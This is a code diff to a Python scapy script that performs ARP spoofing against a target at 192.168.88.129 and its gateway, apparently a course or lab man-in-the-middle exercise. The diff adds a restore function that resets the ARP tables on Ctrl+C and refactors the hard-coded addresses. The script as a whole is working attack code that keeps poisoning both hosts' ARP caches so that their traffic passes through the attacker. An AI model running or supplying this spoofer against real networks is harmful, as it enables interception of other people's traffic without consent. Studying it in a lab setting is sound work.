@@ -12,7 +12,7 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
+    # print(answered_list[0][1])
     return answered_list[0][1].hwsrc
     # clients_list = []
     # for element in answered_list:
@@ -34,14 +34,27 @@ def spoofer(target_ip, spoof_ip):
     # print(packet.summary())
 
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_MAC = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_MAC)
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "192.168.88.129"
+gateway_ip = "192.168.88.2"
 sent_packets_count = 0
 try:
     while True:
-        spoofer("192.168.88.129", "192.168.88.2")
-        spoofer("192.168.88.2", "192.168.88.129")
+        spoofer(target_ip, gateway_ip)
+        spoofer(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Sent two packet: " + str(sent_packets_count), end="")
         # sys.stdout.flush()
         time.sleep(2)  # wait 2 seconds
 except KeyboardInterrupt:
-    print("[+] Detected CTRL + C ..... Quitting.")
+    print("\n[-] Detected CTRL + C ..... Quitting.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+
+
